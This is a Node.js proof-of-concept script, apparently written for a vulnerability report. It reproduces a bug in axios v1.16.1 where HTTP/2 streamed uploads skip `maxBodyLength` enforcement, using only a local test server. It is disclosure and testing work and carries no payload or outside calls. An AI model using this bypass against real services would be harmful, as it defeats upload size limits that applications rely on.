// PoC: HTTP/2 streamed uploads bypass `maxBodyLength` enforcement.
//
// Threat model:
//   The application uses axios on Node.js with `httpVersion: 2` and trusts
//   `maxBodyLength` to cap outbound streamed uploads (e.g. proxying user
//   files, forwarding logs, or just defending against pathological inputs).
//
// Expected behavior:
//   When the streamed body exceeds `maxBodyLength`, axios should abort the
//   request with `AxiosError(ERR_BAD_REQUEST, 'Request body larger than
//   maxBodyLength limit')` — matching the documented HTTP/1 behavior.
//
// Observed behavior on axios v1.16.1:
//   - lib/adapters/http.js:937 — when `httpVersion === 2`, transport is
//     unconditionally `http2Transport`, skipping the native/follow-redirects
//     branches.
//   - lib/adapters/http.js:1274 — the byte-counting wrapper for streamed
//     uploads is gated on `config.maxRedirects === 0`, which never applies
//     to the HTTP/2 path. follow-redirects' own enforcement also doesn't
//     apply because that transport isn't used for HTTP/2.
//   - The full payload is therefore piped into `http2.request()` regardless
//     of `maxBodyLength`.
//
// Run:
//   node research/repros/http2_maxbody_bypass.mjs

import http2 from 'node:http2';
import { Readable } from 'node:stream';
import axios from '../../index.js';

const LIMIT = 1024;
const PAYLOAD_BYTES = 2 * 1024 * 1024;

// Cleartext HTTP/2 (h2c) server. http2.connect() supports h2c when given an
// `http://...` authority, which mirrors what axios does when the request URL
// uses `http://` and `httpVersion: 2`.
const server = http2.createServer();

server.on('stream', (stream, _headers) => {
  let received = 0;
  stream.on('data', (chunk) => {
    received += chunk.length;
  });
  stream.on('end', () => {
    stream.respond({
      ':status': 200,
      'content-type': 'application/json',
    });
    stream.end(JSON.stringify({ received, limit: LIMIT }));
  });
  stream.on('error', () => {
    /* swallow client-side aborts */
  });
});

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const port = server.address().port;

function makeBodyStream(totalBytes) {
  const CHUNK = Buffer.alloc(64 * 1024, 0x41);
  let remaining = totalBytes;
  return new Readable({
    read() {
      if (remaining <= 0) {
        this.push(null);
        return;
      }
      const next = remaining >= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);
      remaining -= next.length;
      this.push(next);
    },
  });
}

try {
  let result;
  try {
    const response = await axios.post(`http://127.0.0.1:${port}/upload`, makeBodyStream(PAYLOAD_BYTES), {
      httpVersion: 2,
      maxBodyLength: LIMIT,
      // We intentionally do NOT set maxRedirects: 0 — that flag activates the
      // existing HTTP/1 byte-counting wrapper. The bug under test is that the
      // HTTP/2 transport path skips that wrapper entirely.
      headers: { 'content-type': 'application/octet-stream' },
      // Omit content-length so the body is streamed without a known length.
    });
    result = { status: response.status, data: response.data };
  } catch (err) {
    result = { error: err && (err.code || err.message) };
  }

  console.log('--- PoC: HTTP/2 maxBodyLength bypass ---');
  console.log('axios result:', JSON.stringify(result));

  const ok =
    result &&
    result.status === 200 &&
    result.data &&
    typeof result.data === 'object' &&
    result.data.received === PAYLOAD_BYTES &&
    result.data.limit === LIMIT;

  if (ok) {
    console.log(
      `VULNERABLE: server received ${result.data.received} bytes despite ` +
        `maxBodyLength=${LIMIT}.`
    );
    process.exitCode = 0;
  } else {
    console.log('NOT VULNERABLE: axios refused or truncated the oversized stream.');
    process.exitCode = 1;
  }
} finally {
  server.close();
  // http2 sessions cached by axios may keep the event loop alive; force exit
  // after the assertion so the script returns instead of idling on TCP keep-alive.
  setImmediate(() => process.exit(process.exitCode || 0));
}
